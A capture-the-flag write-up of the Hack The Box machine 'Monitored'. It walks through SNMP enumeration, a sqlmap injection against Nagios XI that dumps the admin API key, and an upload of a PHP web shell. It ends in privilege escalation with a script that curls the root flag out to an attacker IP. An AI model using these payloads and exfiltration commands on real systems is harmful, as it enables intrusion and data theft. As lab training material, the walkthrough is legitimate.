---
title: HTB Monitored Writeup
author: Elus1nist
layout: post
date: 16 January 2023
imagesrc: https://labs.hackthebox.com/storage/avatars/d4988810825d26acb2e84ca0ac9feaf4.png
---
Welcome! This is my writeup of the new Season 4 Medium machine from HTB, Monitored. 

---
---
## Enumerating Services and Open Ports


So to start, as usual we run an nmap TCP port scan:

```
nmap -sC -sV -oN initial_scan 10.10.11.248 
```
This gives us the scan results of:

```
Nmap scan report for 10.10.11.248
Host is up (0.082s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp  open  http     Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
|_http-title: Nagios XI
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Alright, so now we have the following services that we can exploit:
- Port 22: SSH - This service will probably become accessible once we have some creds
- Port 80: HTTP - We can see a domain name dumped `nagios.monitored.htb` and a redirect so a dead end
- Port 389: LDAP - Since we have this service we can utilize ldap search or also assume SNMP and enumerate that
- Port 443: HTTPS - This is the main web page to be working with

---
---
## Enumerating SNMP

Enumerating SNMP with `public` community string:
```
snmpwalk -v2c -c public 10.10.11.248
STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc ~~redacted~~"
```
This gives us a set of credentials that can be used to log into - 
https://nagios.monitored.htb/nagios/

Once logged in we can then follow the security advisory and launch an SQL Injection attack against an admin endpoint

---
---
## SQL Injection to dump User data

Using the information from a security advisory, I leveraged SQLMap to dump the backend DB:
```
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'`" --level 5 --risk 3 -p id --batch -D nagiosxi -T xi_users
```
| user_id | email | name | api_key | enabled | password | username | 
|---|---|---|---|---|---|---|
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin

We can now interact with the nagios API as an admin user!

---
---
## NagiosXI Admin Pivot

We can now use the nagiosxi API to create a new admin user:
```
curl -XPOST --insecure "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=ElusnAdmin&password=myadmin&name=myadmin&email=myadmin@localhost&auth_level=admin"
```
We can now login to the nagiosxi portal as an admin

*Insert Image here*

---
---
## Setting Up for PHP File Upload

The following steps were taken so as to be 
- Login to /nagiosxi/
- Go to https://nagios.monitored.htb/nagiosxi/includes/components/custom-includes/manage.php
- Upload jpg -> rename to .htaccess -> rename back to test.jpg
- Upload php shell with jpg magic bytes: <?php system($_GET['cmd']); ?>;
- Visit the web shell and get a bash reverse shell
- pop shell as www-data

---
---
## Privilege Escalation Path

As an easy win, I first checked the output of `sudo -l` for commands that could be run as www-data:
```
sudo -l
User www-data may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/snmptt restart
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/messages
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/httpd/error_log
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/mysqld.log
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/repair_databases.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
```

A subsequent search of the linpeas output shows us a writable service executable path:
`/usr/local/nagios/bin/nagios`

---
---
## Privilege Escalation Exploit

### Step 1:

So first we generate a reverse shell executable on the attacker local box `rootrev.sh`:
```
#!/bin/bash
ls_content=$(<"/root/root.txt")
curl -o test "http://10.10.16.44:9001/${ls_content}"
```

### Step 2:
Spin up a python web server (This will be used to fetch stage 1 of the exploit + Recieve data from exfil)
```
sudo python3 -m http.server 9001
```

### Step 3:
Replace nagios executable on target box
```
curl http://10.10.16.44:9001/rootrev.sh -o /usr/local/nagios/bin/nagios
```

### Step 4:
Restart nagios service and gain root flag

```
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
```